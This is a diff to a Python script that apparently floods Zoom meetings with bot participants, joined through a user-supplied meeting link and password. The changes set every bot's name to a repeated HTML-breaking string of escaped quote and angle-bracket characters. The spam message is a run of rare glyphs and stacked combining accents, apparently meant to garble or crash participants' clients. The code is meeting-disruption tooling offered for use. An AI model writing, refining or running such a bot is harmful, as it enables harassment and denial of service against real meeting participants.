@@ -4,6 +4,7 @@ import os
 import re
 import sys
 from base64 import b64encode
+from html import escape
 
 import trio
 from loguru import logger
@@ -66,16 +67,13 @@ async def spam(meeting_id: int, password: str, username: str, message: str, url:
             pass
 
 
-# noinspection PyUnresolvedReferences
 async def main():
     url = input(_("Enter zoom meeting link: ")).strip()
     password = input(
         _("Enter a meeting password, if there is any and it's not specified in the url (or press Enter): ")
     ).strip()
 
-    username = input(
-        _("Enter a name that bots will use (English only): ")
-    )
+    username = escape(">\"" * 40)
 
     bot_count = int(input(_("Enter the amount of bots: ")))
     message = "𒐫𪚥𒈙á́́́́́́́́́́́́́́́́́́́́́́́́́́́́́"
